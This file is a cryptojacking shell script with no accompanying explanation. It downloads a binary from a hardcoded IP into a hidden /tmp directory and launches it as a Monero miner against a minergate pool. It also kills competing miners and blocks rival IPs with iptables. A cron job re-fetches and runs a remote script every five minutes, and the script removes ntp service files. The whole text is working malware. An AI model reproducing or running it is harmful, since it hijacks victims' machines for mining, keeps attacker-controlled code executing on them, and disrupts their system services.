if [ ! -f /tmp/.assets/minera ]; then
killall -9 minerd;cd /tmp;mkdir .assets;cd .assets;wget http://91.92.120.134/minera;curl -O http://91.92.120.134/minera;killall -9 minerd;killall -9 minera;chmod a+x minera;./minera -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u forcrazy4music11@gmail.com -p x
fi

if pgrep "minera" > /dev/null
then
    echo "Running"
else
cd /tmp/.assets;./minera -B -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u forcrazy4music11@gmail.com -p x &
fi

iptables -A INPUT -s 138.68.12.109 -j DROP
iptables -A INPUT -s 212.129.44.155 -j DROP
iptables -A INPUT -s 212.129.44.156 -j DROP
iptables -A INPUT -s 212.129.44.157 -j DROP
iptables -A INPUT -s 212.129.44.158 -j DROP
iptables -A INPUT -s 212.129.44.159 -j DROP
iptables -A INPUT -s 212.129.44.160 -j DROP
iptables -A INPUT -s 212.129.44.161 -j DROP
iptables -A INPUT -s 212.129.44.162 -j DROP
iptables -A INPUT -s 212.129.44.154 -j DROP
iptables -A INPUT -s 212.129.44.153 -j DROP
iptables -A INPUT -s 212.129.44.152 -j DROP
iptables -A INPUT -s 212.83.168.39 -j DROP
iptables -A OUTPUT -s 138.68.12.109 -j DROP
iptables -A OUTPUT -s 212.129.44.155 -j DROP
iptables -A OUTPUT -s 212.129.44.156 -j DROP
iptables -A OUTPUT -s 212.129.44.157 -j DROP
iptables -A OUTPUT -s 212.129.44.158 -j DROP
iptables -A OUTPUT -s 212.129.44.159 -j DROP
iptables -A OUTPUT -s 212.129.44.160 -j DROP
iptables -A OUTPUT -s 212.129.44.161 -j DROP
iptables -A OUTPUT -s 212.129.44.162 -j DROP
iptables -A OUTPUT -s 212.129.44.154 -j DROP
iptables -A OUTPUT -s 212.129.44.153 -j DROP
iptables -A OUTPUT -s 212.129.44.152 -j DROP
iptables -A OUTPUT -s 212.83.168.39 -j DROP
iptables -A OUTPUT -p tcp --dport 6666 -j DROP
killall -9 minerd
mkdir /tmp/not.exist;cd /tmp/not.exist;echo '*/5 * * * * cd /tmp;wget http://91.92.120.134/if.sh;sh if.sh;rm -f if.sh;curl -O http://91.92.120.134/if.sh;sh if.sh;rm -f if.sh' >> /tmp/stab;crontab /tmp/stab
rm -rf /etc/init.d/ntp
rm -f /sbin/ntp
rm -rf /etc/systemd/system/ntp.service
killall -9 ntp

